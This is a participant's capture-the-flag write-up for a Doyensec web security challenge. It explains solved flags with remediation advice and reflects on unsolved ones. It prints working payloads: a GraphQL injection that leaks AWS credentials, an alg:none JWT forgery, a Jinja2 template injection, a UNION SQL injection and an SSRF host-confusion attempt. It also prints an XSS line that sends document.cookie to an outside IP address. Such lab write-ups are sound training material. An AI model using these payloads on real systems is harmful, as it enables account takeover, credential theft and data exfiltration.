# Doyensec - Web Security Challenge

I am writing this report to communicate my thoughts which I couldn't do so on the platform. As, I was trying to get all the flags, I did not get a chance to write down my thought process for the challenges where I couldn't find the flag. 

I also did not write the report for Secret Blog on the site so I'm using this chance to submit the report now. 


# Flags Found:

1. Admin Only (2000) - `DS{uNrg64MKSHMJurxQMNrizvlf_OQK7H}` 
2. DoyensecDB (3000) - `DS{GXXYBU11B1.y4NurRAUSYM0krY2pnk}`
3. Cryptosec (4000) - `DS{e6a3QJWSBBBewXuhAOVwW1xzz_X5VZ}`
4. Secret Blog (6000) - `DS{1kQP._qiHMRJUFzaPctAYQP___.8YON}`

## Secret Blog - GraphQL Injection

### Description

The frontend server constructs GraphQL queries by directly concatenating the user-supplied input into the query strings without any sanitization or parameterization. 

The `/api/blogs/:id` endpoint then inserts the `id` path parameter directlty into a GraphQL query body which enables an attacker to inject GraphQL syntax of their choosing.

This allows the attacker to break out of the intended `getBlogById` query and append additional operations such making calls to `getAWSConfig`. A call that is normally restricted to admin users and should be accessible via a separate endpoint (`/api/config/:env`)

### Reproduction Steps

1. Log in to the application using user:pwd credentials via POST /login
2. Capture the `doyensec_secretblog` JWT cookie from the login response
3. Send the following crafted GET request in Burp Repeater:

```http
GET /api/blogs/1)%20{%20id%20}%20awsConfig:%20getAWSConfig(env:%20%22prod%22)%20{%20environment%20access_key_id%20secret_key%20}%20x:%20getBlogById(id:%201 HTTP/1.1
Host: <target>
Cookie: doyensec_secretblog=<jwt>
```
4. This causes the backend to execute the following injected GraphQL query:

```graphql
query {
    getBlogById(id: 1) { id }
    awsConfig: getAWSConfig(env: "prod") {
        environment
        access_key_id
        secret_key
    }
    x: getBlogById(id: 1) {
        id author title body
    }
}
```

5. The response returns the AWS creds for the `prod` environment:

```json
{
  "awsConfig": {
    "environment": "prod",
    "access_key_id": "AKIAIOSFODNN7FLAG",
    "secret_key": "DS{lkOp._qiHMRJUFzaPctAYQP__.8yON}"
  }
}
```

### Impact

A regular authenticated user (non-admin) can fully bypass the role-based access control that guards the `/api/config/:env` endpoint and retrieve AWS production credentials (`access_key_id` + `secret_key`). 

With these credentials, an attacker could gain unauthorized access to AWS infrastructure, potentially leading to data exfiltration, exhaust or abuse the resources on AWS, attempt privilege escalation within AWS, or even a full cloud environment compromise. 


### Complexity

I would say Low because a single crafted HTTP request was used to compromise it. No special tools, chained vulnerabilities, or advanced knowledge beyond basic GraphQL syntax was required and The injection point is directly accessible and unauthenticated at the GraphQL level.

### Remediation

1. Use GraphQL Variables (Primary Fix)
Replace string concatenation with parameterized queries using GraphQL variables:

```js
// Before (vulnerable)
graphqlQuery = JSON.stringify({
    query: "query { getBlogById(id: " + id + ") { ... } }"
})

// After (safe)
graphqlQuery = JSON.stringify({
    query: "query GetBlog($id: Int!) { getBlogById(id: $id) { id author title body } }",
    variables: { id: parseInt(id, 10) }
})
```

2. Enforce Input Type Validation

Validate and cast `id` to an integer before use, rejecting any non-numeric input with a 400 error:

```js
const id = parseInt(req.params.id, 10);
if (isNaN(id)) return res.status(400).send("Invalid id");
```

3. Apply the Same Fix to `/api/config/:env`
The `env` parameter in the config endpoint is equally vulnerable to injection and must also be parameterized:

```js
graphqlQuery = JSON.stringify({
    query: "query GetConfig($env: String!) { getAWSConfig(env: $env) { environment access_key_id secret_key } }",
    variables: { env: req.params.env }
})
```

4. Defense in Depth — Restrict GraphQL Query Depth/Complexity

Consider implementing query limiting and whitelisting the operations that can be performed on the GraphQL server to prevent multi-operation abuse even if injection was somehow reintroduced again in the environment.

Once upon a time a security professional said, "[Never trust user input](https://www.reddit.com/r/ProgrammerHumor/comments/vyygk4/friendly_reminder_to_never_trust_user_input/)" and they were right.

# Flags Not Found

1. Security Advisory Alerts
2. Doyensec Careers
3. Secure Login
4. UsersQL


## 1. Security Advisory Alerts

Unfortunately, I spent more time here which led to improper time management for the next few challenges. 

This would be due to my lack of using webhooks and getting familiar with it. 


After fuzzing a bunch of requests, I thought that there is a possiblilty that the backend is concatenating badly and it's doing something like


```python
request(host + path)
```


When I did get an Invalid host error from trying different requests, it made me think that th app is validating allowed hosts or likely expecting specific format or only external domains


I had to read up and what attack vectors exist, what I could do and what I couldn't do. I was able to get the server to tell me that the endpoint is available only internally. What I didn't understand was how I could have used mockbin here

Maybe redirect my request to mockbin? 

I was able to get an Internal Server Error using the request

```json
{
    "host":"mockbin.org",
    "path":"@127.0.0.1:10001/flag"
}
```

In one of the errors that I saw, it said 

```http
Error: Get "http://mockbin.org@0127.0.0.1:10001/flag": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
```

Which made me believe that the concatenation theory is right and it tried to connect and I reached the internal network path and I was hitting the wrong port maybe 

I tried a few more requests but I was getting blocked by auth and getting a 401 of authorization required. 


```json
{
  "host": "mockbin.org",
  "path": "@b6221a...doyenpwn.us/flag"
}
```

I focused too much on URL and trying to confuse the server with `@` but I should have worked on how the backend is contructing the requests from host + path. 


## 2. Doyensec Careers

Looking back on this challenge and my burp suite history, I think I realized where I went wrong here. I was focused on trying to get the XSS to talk to my reverse shell, but that was the wrong approach. 

My first few inputs were XSS payloads and thre response to those payloads was just comment received. 

I never got the payload to respond with, "We notified the HR agent" and I got excited doing an XSS that I did not focus on the hint that was provided.

*Ask your representative to read you aloud the flag!* 

That's what I should have focused on try to manipulate the DOM, and alert, instead of trying to get a reverse shell working. 

Payloads that I tried:

```json
{"name":"test","comment":"<img src=x onerror=alert(1)>"}
```

This gave a response of comment received, so I hoped that the comment would be reviwed by the bot and then it will run that command. 

That made me believe that since I was trying to get a reverse shell, the payloads that I was fuzzing with, were something along the lines of:

```html
<img src=x onerror="fetch('http://131.204.27.175:4444/?c='+document.cookie)">
```

I will admit, I have a lot to learn about DOMs and mastering XSS. Time for some PortSwigger Academy to relearn stored XSS. 

When looking around I found a few blog posts, mentioning Burp Colloaborator, I don't know if that would have been usedful, I haven't tried it yet but google believed that is what I should be looing at. 

## 3. Secure Login

I was trying to target the cookies `doynsec_secretblog` and `doyensec_maintenance` 

I got too focused on the hardcoded otp and everytime when I was trying to change the request from 

```json
{"username":"user","otp":"1234"}
```

to

```json
{"username":"admin","otp":"1234"}
```

The server kept denying the requests and I couldn't get the server to reveal more information. I think this is where I started to feel the time crunch and didn't stop and think where the attack was failing or which cookie should remain the same and which one should be tampered with. 

I need to work on some more complicated JWT token labs to truly master it and I do remember a medium post talked about a JWT extension in Burp Suite that I should use but I did not want to play with a new extension while trying to find a flag under a time crunch task. 


In the end, I was able to get an `Internal Server Error` by removing the signature from the JWT payload and modifying the GET /admin request

I beleive that if I would have probed it to give me a cookie that was admin from the `doyensec_secretblog` cookie, then making the request through GET /otp which would then help me get the maintenance token. 

That way the server would think that an admin is logging in, and it would bypass it and give me the flag. 

## 4. UsersQL

The wordplay here made me think of GraphQL to reach a SQL bug

```graphql
query getMe {
  getMe {
    id
    username
    apikey
    roleId
    error
  }
}
```

Here we had a new cookie `doyensec_under_construction`. I thought that this is what the server users to determine who the user is in the getMe query

Looking at PortSwigger I wanted to try introspection but I thought of what if getMe is a suggestion for getUser and try to test for IDOR issues. 

With that, I hit a roadblock of things to try in the IDOR and thought of abusing the `doyensec_under_construction` to get in. 

I believe I need to do more PortSwigger Labs and HTB challenges with GraphQL endpoings and JWTs. The hard challenges were focused around that and it would help me level up my offensive skills even more. 


# Takeaways

I would like to thank the engineers that worked on this platform and built it. It was a lot of fun and I enjoyed getting those flags. 

I have built labs for my students this semester and I have realized that it's a lot of DevOps work and it's very time consuming. I am glad that I got a chance to take a crack at it. 

I have a lot of room to grow as a security engineer and try to attempt more PortSwigger Labs and get out of my comfort zone. 

Writing this report also helped me back to retrace my steps and understand where I was going wrong. 

# Flags Found Commands

1. Admin Only

```json
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzc0MTk5MTA5fQ.
```

Breakdown of the forgery:

Header (alg: none): `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

Payload (admin: true): `eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzc0MTk5MTA5fQ`


2. DoyensecDB – SSTI and I exploited Jinja2 template injection to execute arbitrary server-side code

payload

```python
/?year={{request.application.__globals__.__builtins__.open('flag.txt').read()}}
```

3. Cryptosec (4000) 

WebSocket SQL Injection

```json
{
  "action": "refresh",
  "ticker": "' UNION SELECT flag, 'x' FROM flags--"
}
```

4. Secret Blog (6000)

```http
GET /api/blogs/1)%20{%20id%20}%20awsConfig:%20getAWSConfig(env:%20%22prod%22)%20{%20environment%20access_key_id%20secret_key%20}%20x:%20getBlogById(id:%201 HTTP/1.1
Host: <target>
Cookie: doyensec_secretblog=<jwt>
```



